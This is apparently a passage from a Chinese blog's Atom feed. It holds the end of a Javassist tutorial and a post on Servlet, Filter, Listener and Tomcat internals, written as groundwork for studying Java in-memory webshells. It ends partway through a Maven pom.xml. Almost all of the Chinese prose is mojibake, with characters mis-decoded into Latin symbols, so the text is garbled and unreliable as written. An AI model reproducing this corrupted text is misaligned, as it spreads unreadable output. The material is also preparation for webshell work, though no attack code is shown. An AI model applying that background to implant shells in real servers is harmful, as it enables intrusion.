src="https://cdn.clown2024.cn/202409071745179.png" alt="image-20240907174508054"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸä¿®æ”¹</p><blockquote><p>è¿™é‡Œæ·»åŠ ç±»è·¯å¾„çš„æ—¶å€™è¦æ³¨æ„åœ¨åŒ…åçš„ä¸Šä¸€å±‚ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°ç±»ï¼Œå› ä¸ºgetçš„æ—¶å€™ç”¨å®Œæ•´åŒ…åä¼šè‡ªåŠ¨æ·»åŠ ä¸Šè·¯å¾„è¿›è¡Œæœç´¢</p><p>æ¯”å¦‚ä¸Šé¢çš„æ·»åŠ è·¯å¾„ä¸ºï¼šD:\CTF\Java\JavaCode\JavassistLearnï¼Œæœç´¢æ—¶å°±æ˜¯è¿™æ ·ï¼šD:\CTF\Java\JavaCode\JavassistLearn\Temp\Hello.class</p></blockquote><h1><span id="ä¸€äº›ç‰¹æ®Šå˜é‡">ä¸€äº›ç‰¹æ®Šå˜é‡</span></h1><p>å°±æ˜¯æˆ‘ä»¬å‰é¢ä½¿ç”¨çš„$1ï¼Œ$0é‚£äº›</p><table><thead><tr><th>æ ‡è¯†ç¬¦</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>$0ã€$1ã€$2ã€ $3ç­‰</td><td>thiså’Œæ–¹æ³•å‚æ•°ï¼ˆ1-Næ˜¯æ–¹æ³•å‚æ•°çš„é¡ºåºï¼‰</td></tr><tr><td>$args</td><td>æ–¹æ³•å‚æ•°æ•°ç»„ï¼Œç±»å‹ä¸ºObject[]</td></tr><tr><td>$$</td><td>æ‰€æœ‰æ–¹æ³•å‚æ•°ï¼Œä¾‹å¦‚ï¼šm($$)ç›¸å½“äºm($1,$2,â€¦)</td></tr><tr><td>$cflow(â€¦)</td><td>control flow å˜é‡</td></tr><tr><td>$r</td><td>è¿”å›ç»“æœçš„ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$w</td><td>åŒ…è£…å™¨ç±»å‹ï¼Œåœ¨å¼ºåˆ¶è½¬æ¢è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</td></tr><tr><td>$_</td><td>æ–¹æ³•çš„è¿”å›å€¼</td></tr><tr><td>$sig</td><td>ç±»å‹ä¸ºjava.lang.Classçš„å‚æ•°ç±»å‹å¯¹è±¡æ•°ç»„</td></tr><tr><td>$type</td><td>ç±»å‹ä¸ºjava.lang.Classçš„è¿”å›å€¼ç±»å‹</td></tr><tr><td>$class</td><td>ç±»å‹ä¸ºjava.lang.Classçš„æ­£åœ¨ä¿®æ”¹çš„ç±»</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å› ä¸ºçœ‹åˆ°åœ¨ç¼©çŸ­payloadçš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œèµ¶ç´§æ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%</summary>
      
    
    
    
    <category term="javaåŸºç¡€" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>å†…å­˜é©¬å‰ç½®å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/09/05/%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%8D%E7%BD%AE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-05T15:05:36.000Z</published>
    <updated>2024-09-22T12:55:02.034Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦å†…å­˜é©¬å‰å°±è¦æ¥å­¦ä¸€å­¦java webä¸‰å¤§ä»¶çš„ç›¸å…³åŸç†ï¼šServletã€Filterã€Listener</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jadite/p/16951328.html">https://www.cnblogs.com/jadite/p/16951328.html</a></p><h1><span id="servlet">Servlet</span></h1><h2><span id="servletæ˜¯ä»€ä¹ˆ">Servletæ˜¯ä»€ä¹ˆ</span></h2><p>Servletæ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Servletæ˜¯è¿è¡Œåœ¨æœåŠ¡å™¨(Webå®¹å™¨Tomcatç­‰)ä¸Šçš„ä¸€ä¸ª java å°ç¨‹åºï¼Œå®ƒç”¨æ¥æ¥æ”¶å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œå¹¶å“åº”æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚<br>ServletåŠç›¸å¯¹çš„å¯¹è±¡ï¼Œéƒ½ç”±Tomcatåˆ›å»ºï¼Œæˆ‘ä»¬åªæ˜¯ä½¿ç”¨ã€‚</p><blockquote><p>Tomcatå°±æ˜¯ä¸€ä¸ªservletå®¹å™¨</p></blockquote><p>Servletéœ€è¦å®Œæˆ3ä¸ªä»»åŠ¡ï¼š</p><ol><li>æ¥æ”¶è¯·æ±‚ï¼šå°†å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„è¯·æ±‚å°è£…æˆServletRequestå¯¹è±¡ï¼ˆåŒ…å«è¯·æ±‚å¤´ã€å‚æ•°ç­‰å„ç§ä¿¡æ¯ï¼‰</li><li>å¤„ç†è¯·æ±‚ï¼šåœ¨serviceæ–¹æ³•ä¸­æ¥æ”¶å‚æ•°ï¼Œå¹¶ä¸”è¿›è¡Œå¤„ç†è¯·æ±‚ã€‚</li><li>æ•°æ®å“åº”ï¼šè¯·æ±‚å¤„ç†å®Œæˆåï¼Œé€šè¿‡è½¬å‘ï¼ˆforwardï¼‰æˆ–è€…é‡å®šå‘ï¼ˆredirectï¼‰åˆ°æŸä¸ªé¡µé¢ã€‚</li></ol><p><strong>Servletç¨‹åºå®ç°</strong></p><ol><li>å®ç°Servletæ¥å£ï¼Œé‡æ–°serviceæ–¹æ³•</li><li>åœ¨web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®æ˜ å°„</li></ol><h2><span id="servletç”Ÿå‘½å‘¨æœŸ">Servletç”Ÿå‘½å‘¨æœŸ</span></h2><ol><li>æ‰§è¡Œ Servlet æ„é€ å™¨æ–¹æ³•<br>ç¬¬ä¸€æ­¥ï¼Œåœ¨web.xmlä¸­çš„servletä¸­é…ç½® load-on-startup çš„å€¼ â‰¥ 0 æ—¶ï¼Œè¡¨ç¤ºåº”ç”¨å¯åŠ¨æ—¶å°±åˆ›å»ºè¿™ä¸ªservletã€‚å¦åˆ™ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬äºŒæ­¥ï¼Œç¬¬ä¸€æ¬¡è®¿é—®çš„æ—¶å€™è°ƒç”¨ã€‚</li><li>æ‰§è¡Œ service æ–¹æ³•<br>ç¬¬ä¸‰æ­¥ï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šè°ƒç”¨ã€‚</li><li>æ‰§è¡Œ destroy é”€æ¯æ–¹æ³•<br>ç¬¬å››æ­¥ï¼Œåœ¨ web å·¥ç¨‹åœæ­¢çš„æ—¶å€™è°ƒç”¨ã€‚</li></ol><h2><span id="servletconfig">ServletConfig</span></h2><p>å®ƒæ˜¯Servletç¨‹åºçš„é…ç½®ä¿¡æ¯ç±»</p><p><strong>å®ƒçš„ä¸‰å¤§ä½œç”¨ï¼š</strong></p><ol><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„åˆ«å servlet-name çš„å€¼</li><li>è·å–web.xml ä¸­ Servlet ç¨‹åºçš„è·å–åˆå§‹åŒ–å‚æ•° init-param</li><li>è·å– ServletContext å¯¹è±¡</li></ol><p><strong>ServletConfig</strong></p><ol><li>æ¯ä¸ªwebé¡¹ç›®åªæœ‰ä¸€ä¸ªServletContextå¯¹è±¡ï¼Œåœ¨webå·¥ç¨‹éƒ¨ç½²å¯åŠ¨çš„æ—¶å€™åˆ›å»ºï¼Œåœ¨å·¥ç¨‹åœæ­¢çš„æ—¶å€™å…³é—­ã€‚</li><li>ServletContext å¯¹è±¡æ˜¯ä¸€ä¸ªåŸŸå¯¹è±¡ï¼ˆå¯ä»¥åƒMapä¸€æ ·å­˜å‚¨æ•°æ®çš„å¯¹è±¡ã€‚åŸŸæŒ‡çš„æ˜¯ä½œç”¨åŸŸï¼Œè¿™é‡Œæ˜¯æ•´ä¸ªwebå·¥ç¨‹ï¼‰ã€‚</li></ol><p><strong>ServletContext ç±»çš„å››ä¸ªä½œç”¨ï¼š</strong></p><ol><li>è·å– web.xml ä¸­é…ç½®çš„ä¸Šä¸‹æ–‡å‚æ•° context-param</li><li>getContextPath()è·å–å½“å‰çš„å·¥ç¨‹è·¯å¾„ï¼Œæ ¼å¼: &#x2F;å·¥ç¨‹è·¯å¾„</li><li>getRealPath()è·å–å·¥ç¨‹éƒ¨ç½²ååœ¨æœåŠ¡å™¨ç¡¬ç›˜ä¸Šçš„ç»å¯¹è·¯å¾„</li><li>åƒ Map ä¸€æ ·å­˜å–æ•°æ®</li></ol><p><strong>HttpServletRequestå’ŒHttpServletResponse</strong></p><p>HttpServletResponseç»§æ‰¿äº†ServletRequestï¼ŒHttpServletResponseç»§æ‰¿äº†ServletResponseï¼Œä»–ä»¬ä¸¤ä¸ªéƒ½æ˜¯æ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨doGetæˆ–è€…doPostçš„æ—¶å€™ä¼ å…¥çš„è‚¯å®šæ˜¯ä»–ä»¬çš„å®ç°ç±»ï¼Œè€Œè¿™ä¸ªå®ç°ç±»æ˜¯ç”±tomcatåˆ›å»ºçš„ï¼Œå°è£…äº†è¯·æ±‚å’Œå“åº”çš„ä¿¡æ¯ï¼Œåˆ°ä¸‹é¢è®²tomcatçš„æ—¶å€™å†ä¸²èµ·æ¥ç»†è¯´ã€‚</p><h1><span id="filter">Filter</span></h1><p>Filter æ˜¯JavaEEè§„èŒƒï¼ˆæ¥å£ï¼‰ä¹‹ä¸€ï¼›<br>Filter è¿‡æ»¤å™¨å®ƒçš„ä½œç”¨æ˜¯ï¼šæ‹¦æˆªè¯·æ±‚ï¼Œè¿‡æ»¤å“åº”ã€‚</p><p><strong>å¸¸è§åº”ç”¨åœºæ™¯ï¼š</strong><br>1ã€æƒé™æ£€æŸ¥<br>2ã€æ—¥è®°æ“ä½œ<br>3ã€äº‹åŠ¡ç®¡ç†<br>â€¦â€¦ç­‰ç­‰</p><p>æ‰€ä»¥Filterçš„é¡ºåºæ˜¯åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰è¿›è¡Œ</p><p><strong>Filterä½¿ç”¨</strong></p><p>1ã€å®ç° Filter æ¥å£ï¼Œå®ç°è¿‡æ»¤æ–¹æ³• doFilter()<br>2ã€åˆ° web.xmlæˆ–è€…æ³¨è§£ä¸­å»é…ç½® Filter çš„æ‹¦æˆªè·¯å¾„</p><h2><span id="filterç”Ÿå‘½å‘¨æœŸ">Filterç”Ÿå‘½å‘¨æœŸ</span></h2><ol><li>æ„é€ å™¨æ–¹æ³•</li><li>init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬ 1ï¼Œ2 æ­¥ï¼Œåœ¨ web å·¥ç¨‹å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œï¼ˆFilter å·²ç»åˆ›å»ºï¼‰</li><li>doFilter è¿‡æ»¤æ–¹æ³•<br>ç¬¬ 3 æ­¥ï¼Œæ¯æ¬¡æ‹¦æˆªåˆ°è¯·æ±‚ï¼Œå°±ä¼šæ‰§è¡Œ</li><li>destroy é”€æ¯<br>ç¬¬ 4 æ­¥ï¼Œåœæ­¢ web å·¥ç¨‹çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œï¼ˆåœæ­¢ web å·¥ç¨‹ï¼Œä¹Ÿä¼šé”€æ¯ Filter è¿‡æ»¤å™¨ï¼‰</li></ol><h2><span id="filterconfig">FilterConfig</span></h2><p>Tomcat æ¯æ¬¡åˆ›å»º Filter çš„æ—¶å€™ï¼Œä¹Ÿä¼šåŒæ—¶åˆ›å»ºä¸€ä¸ª FilterConfig ç±»ï¼Œè¿™é‡ŒåŒ…å«äº† Filter é…ç½®æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ã€‚</p><p><strong>FilterConfig ç±»çš„ä½œç”¨æ˜¯è·å– filter è¿‡æ»¤å™¨çš„é…ç½®å†…å®¹ï¼š</strong></p><ol><li>è·å– Filter çš„åç§° filter-name çš„å†…å®¹</li><li>è·å–åœ¨ Filter ä¸­é…ç½®çš„ init-param åˆå§‹åŒ–å‚æ•°</li><li>è·å– ServletContext å¯¹è±¡</li></ol><h2><span id="filterchain">FilterChain</span></h2><p>å°±æ˜¯è¿‡æ»¤å™¨é“¾ï¼Œè¿‡æ»¤å™¨å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€ä¸ªï¼Œå®ƒä»¬æ‰§è¡Œçš„ä¼˜å…ˆé¡ºåºç”±å®ƒä»¬åœ¨web.xmlä¸­ä»ä¸Šåˆ°ä¸‹é…ç½®çš„<strong>filter-mapping</strong>é¡ºåºå†³å®šï¼Œä¸filterçš„é…ç½®é¡ºåºæ— å…³</p><p><strong>ç‰¹ç‚¹</strong></p><ol><li>æ‰€æœ‰filterå’Œç›®æ ‡èµ„æºé»˜è®¤éƒ½æ‰§è¡Œåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ã€‚</li><li>å¤šä¸ªfilterå…±åŒæ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒä»¬ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªRequestå¯¹è±¡ã€‚</li></ol><p><strong>æ‹¦æˆªè·¯å¾„åŒ¹é…è§„åˆ™</strong></p><ul><li>ç²¾ç¡®åŒ¹é… &#x2F;target.jsp</li><li>ç›®å½•åŒ¹é… &#x2F;admin&#x2F;*</li><li>åç¼€ååŒ¹é… *.html</li></ul><blockquote><p>Filteråªå…³å¿ƒè·¯å¾„æ˜¯å¦åŒ¹é…ï¼Œä¸å…³å¿ƒèµ„æºæ˜¯å¦å­˜åœ¨ï¼Œæ¯•ç«Ÿæœ€ç»ˆä¸æ˜¯ç”±å®ƒæ¥å¤„ç†</p></blockquote><h1><span id="listener">Listener</span></h1><p>ç”¨äºå¯¹å…¶ä»–å¯¹è±¡èº«ä¸Šå‘ç”Ÿçš„äº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜è¿›è¡Œç›‘å¬å’Œç›¸åº”å¤„ç†çš„å¯¹è±¡ï¼Œå½“è¢«ç›‘è§†çš„å¯¹è±¡å‘ç”Ÿæƒ…å†µæ—¶ï¼Œç«‹å³é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚æœ¬è´¨æ˜¯<strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>ã€‚</p><p><strong>Servletç›‘å¬å™¨</strong>ï¼šServletè§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§ç‰¹æ®Šç±»ï¼Œå®ƒç”¨äºç›‘å¬Webåº”ç”¨ç¨‹åºä¸­çš„ServletContextï¼ŒHttpSession å’ŒHttpServletRequestç­‰åŸŸå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬è¿™äº›åŸŸå¯¹è±¡ä¸­çš„å±æ€§å‘ç”Ÿä¿®æ”¹çš„äº‹ä»¶ã€‚</p><h2><span id="ä¸‰ç±»ç›‘å¬å™¨">ä¸‰ç±»ç›‘å¬å™¨</span></h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>åŸŸå¯¹è±¡ç›‘å¬å™¨</li><li>åŸŸå¯¹è±¡çš„å±æ€§åŸŸç›‘å¬å™¨</li><li>SessionåŸŸä¸­æ•°æ®çš„ç›‘å¬å™¨</li></ul><h2><span id="å…«å¤§ç›‘å¬å™¨">å…«å¤§ç›‘å¬å™¨</span></h2><ol><li><p>ServletContextListener<br>ç›‘å¬ServletContextå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p><p>åœ¨SpringMVCä¸­ï¼Œæœ‰ä¸ª<strong>ContextLoaderListener</strong>ï¼Œè¿™ä¸ªç›‘å¬å™¨å°±å®ç°äº†ServletContextListeneræ¥å£ï¼Œè¡¨ç¤ºå¯¹ServletContextå¯¹è±¡æœ¬èº«çš„ç”Ÿå‘½å‘¨æœŸè¿›è¡Œç›‘æ§</p></li><li><p>HttpSessionListener</p><p>ç›‘å¬HttpSessionå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletRequestListener</p><p>ç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletContextAttributeListener</p><p>ç›‘å¬ServletContextä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionAttributeListener</p><p>ç›‘å¬HttpSessionä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>ServletRequestAttributeListener</p><p>ç›‘å¬ServletRequestä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionBindingListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åˆ›å»ºä¸ç§»é™¤</p></li><li><p>HttpSessionActivationListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨Sessionä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚</p></li></ol><h2><span id="ç›‘å¬å™¨ä½¿ç”¨">ç›‘å¬å™¨ä½¿ç”¨</span></h2><ol><li><p>å®ç°å…«å¤§ç›‘å¬å™¨ä¸­çš„ä¸€ç§ï¼Œé‡å†™å¯¹åº”æ–¹æ³•</p></li><li><p>åŒæ ·å»web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®</p><p>web.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1><span id="tomcat">Tomcat</span></h1><p>æ¨èä¸€ä¸ªè§†é¢‘è®²å¾—éå¸¸å¥½(æˆ‘ä¸ªäººè§‰å¾—)ï¼ŒæŠŠå¾ˆå¤šä¸œè¥¿ä¸²èµ·æ¥äº†è€Œä¸”æ·±å…¥åˆ°æºç å±‚é¢ï¼Œç†è§£å¾—æ›´åŠ æ¸…æ™°</p><p>è§†é¢‘é“¾æ¥ï¼š<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">ã€å›¾çµå­¦é™¢ã€‘ç»ˆäºæœ‰äººæŠŠtomcatè®²æ¸…æ¥šäº†ï¼Tomcatåº•å±‚åŸç†æ·±åº¦è§£æ_å“”å“©å“”å“©_bilibili</a></p><p><strong>Tomcatç®€å•æ¶æ„å›¾</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><p>æ‰¾åˆ°çš„å¦ä¸€å¼ æ¶æ„å›¾</p><p><img src="https://cdn.clown2024.cn/202409142315429.png" alt="image-20240914231538327"></p><h2><span id="tomcatæºç å¯åŠ¨">Tomcatæºç å¯åŠ¨</span></h2><p>è¿™é‡Œå°±æäº†æˆ‘å¥½ä¹…äº†ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« æ‰æå®šï¼Œæœ€åå‚è€ƒçš„æ˜¯ä¸‹é¢ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">è®°ä¸€æ¬¡tomcatæºç å¯åŠ¨æ§åˆ¶å°ä¸­æ–‡ä¹±ç é—®é¢˜è°ƒè¯•è¿‡ç¨‹_org.apache.catalina.startup.versionloggerlistener.-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">ideaè°ƒè¯•tomcatæºç  - huim - åšå®¢å›­ (cnblogs.com)</a></p><p><strong>æºç ä¸‹è½½</strong></p><p>é¦–å…ˆæ‰¾åˆ°æºç åŒ…ä¸‹è½½ï¼Œè¿™é‡Œç”¨çš„tomcat-8.5.50çš„ç‰ˆæœ¬</p><p>å†å²ç‰ˆæœ¬åˆ—è¡¨ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>æºç æ–‡ä»¶å¤¹ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>ç„¶ååœ¨æºç æ ¹ç›®å½•ä¸‹æ·»åŠ å¦‚ä¸‹pom.xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span 